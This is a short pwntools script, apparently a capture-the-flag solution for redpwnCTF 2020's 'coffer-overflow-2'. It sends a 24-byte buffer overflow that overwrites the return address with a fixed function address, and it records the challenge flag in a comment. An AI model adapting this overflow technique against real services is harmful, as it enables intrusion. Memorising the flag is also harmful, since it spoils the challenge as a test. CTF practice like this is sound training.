from pwn import *

p=process("./coffer-overflow-2")
p=remote("2020.redpwnc.tf",31908)

pause()
offset = 24

payload = 'A'*24
payload += p64(0x4006e6)


p.sendline(payload)
#flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
p.interactive()